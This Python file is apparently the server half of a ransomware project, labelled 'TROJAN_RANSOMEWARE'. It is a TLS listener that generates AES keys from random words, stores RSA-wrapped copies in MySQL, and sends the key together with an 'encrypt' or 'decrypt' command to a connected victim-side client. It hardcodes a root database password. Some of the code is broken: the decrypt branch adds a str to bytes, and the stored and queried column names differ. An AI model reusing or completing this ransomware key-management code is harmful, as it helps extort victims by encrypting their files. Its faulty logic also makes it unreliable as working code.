import os
import socket
import ssl
import mysql.connector
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import PKCS1_OAEP
import base64
from random_word import RandomWords



HOST = "0.0.0.0"
PORT = 44444

cert_pem = "D:\\python_programmers_clab\\TROJAN_RANSOMEWARE\\cert.pem"
key_pem = "D:\\python_programmers_clab\\TROJAN_RANSOMEWARE\\key.pem"

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=cert_pem,keyfile=key_pem)

def mysql_insert_random_word(word):
    sql_conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="Galking22!!!",
        database="my_server_trojan"
    )
    cursor = sql_conn.cursor()
    
    cursor.execute("INSERT INTO random_words (word) VALUES (%s)", (word,))
    sql_conn.commit()

    print(f"the secret word ({word}) has been saved successfully")
    
    cursor.close()
    sql_conn.close()

def save_encrypted_key_to_db(encrypted_key_b64):
    conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="Galking22!!!",
        database="my_server_trojan"
    )
    cursor = conn.cursor()

    cursor.execute("INSERT INTO encrypted_keys (encrypted_key) VALUES (%s)", (encrypted_key_b64,))
    conn.commit()

    print("Encrypted AES key has been saved successfully")

    cursor.close()
    conn.close()

def mysql_retrieve_last_word():
    conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="Galking22!!!",
        database="my_server_trojan"
    )
    cursor = conn.cursor()

    cursor.execute("SELECT word FROM random_words ORDER BY id DESC LIMIT 1")
    result = cursor.fetchone()  # מחזיר טופל, לדוגמה: ('abcde...',)
    word = result[0]

    cursor.close()
    conn.close()

    return word
    
def mysql_retrieve_last_key():
    conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="Galking22!!!",
        database="my_server_trojan"
    )
    cursor = conn.cursor()

    cursor.execute("SELECT key_data FROM encrypted_keys ORDER BY id DESC LIMIT 1")
    result = cursor.fetchone()  # לדוגמה: (b'...bytes...',)
    key = result[0] if result else None

    cursor.close()
    conn.close()

    return key
    
def generate_aes_key_from_secret(secret_word):
    hasher = SHA256.new()
    hasher.update(secret_word.encode())
    key = hasher.digest()
    return key

def encrypt_aes_key_with_rsa(aes_key):
    with open("server_RSA_public.pem", "rb") as f:
        public_key = RSA.import_key(f.read())
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_key = cipher_rsa.encrypt(aes_key)

    # מקודד את הפלט לבייס64 לצורך שמירה כטקסט
    return base64.b64encode(encrypted_key).decode()

def decrypt_RSA_from_AES_key(encrypted_aes_key):
    with open("server_RSA_private.pem", "rb") as f:
        private_key = RSA.import_key(f.read())

    cipher_rsa = PKCS1_OAEP.new(private_key)
    
    aes_key = cipher_rsa.decrypt(encrypted_aes_key)
    
    return aes_key

    
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST,PORT))
    s.listen(1)
    
    with context.wrap_socket(s, server_side=True) as secure_sock:
        
        conn, address = secure_sock.accept()
        
        with conn:
            print(f"Got conn from {address}/nthe conn is using TLS")
            
            action = "decrypt"
            
            if action == "encrypt":
                
                r = RandomWords()
                random_word = r.get_random_word()
                
                mysql_insert_random_word(random_word)
                
                the_word = mysql_retrieve_last_word()
                aes_key = generate_aes_key_from_secret(the_word)
                
                aes_key_encrypt_by_RSA = encrypt_aes_key_with_rsa(aes_key)
                save_encrypted_key_to_db(aes_key_encrypt_by_RSA)
                
                conn.sendall(aes_key + b"__END__")
            
            elif action == "decrypt":
                encrypt_aes_key_by_rsa = mysql_retrieve_last_key()
                
                aes_key = decrypt_RSA_from_AES_key(encrypt_aes_key_by_rsa)

                conn.sendall(aes_key + "__END__")
            
            # נשלח ללקוח אם אני רוצה שהוא יצפין או יפענח
            # צריך לשנות ידנית כל פעם אם רוצים שהוא יצפין או יפענח
            # For it to encrypt, you need to write to the variable "action" the value "encrypt" 
            # For it to decrypt, you need to write to the variable "action" the value "decrypt"
            
            if action == "encrypt" or action == "decrypt":
                conn.sendall(action.encode())
                conn.sendall(b"__END__")
                
            answer = ""
            while True:
                answer = answer + conn.recv(1024).decode()
                
                if answer.endswith("__END__"):
                    answer = answer.removesuffix("__END__")
                    break
            print(answer)